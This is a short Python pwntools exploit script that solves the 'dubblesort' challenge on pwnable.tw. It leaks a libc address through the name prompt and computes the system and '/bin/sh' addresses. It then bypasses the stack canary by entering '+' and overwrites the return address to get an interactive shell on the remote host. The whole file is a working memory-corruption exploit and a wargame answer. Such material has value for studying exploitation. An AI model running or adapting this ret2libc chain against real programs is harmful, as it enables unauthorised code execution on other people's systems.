#! /usr/bin/python
from pwn import *

r = process('./dubblesort',env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw', 10101)

r.sendlineafter('What your name :','A'*24)
r.recvuntil('A'*24)
leak = u32(r.recv(4))
addr_libc = leak - 0x0a - 0x1b0000
success('addr_libc = '+hex(addr_libc))

addr_system = addr_libc + 0x03a940
addr_binsh = addr_libc + 0x158e8b

log.info('addr_system = '+hex(addr_system))
log.info('addr_binsh = '+hex(addr_binsh))

r.sendlineafter('do you what to sort :','35')

for i in range(24):
    r.sendlineafter('number : ','1')
r.sendlineafter('number : ','+')
for i in range(8):
    r.sendlineafter('number : ',str(addr_system))    
for i in range(2):
    r.sendlineafter('number : ',str(addr_binsh))    
r.interactive()
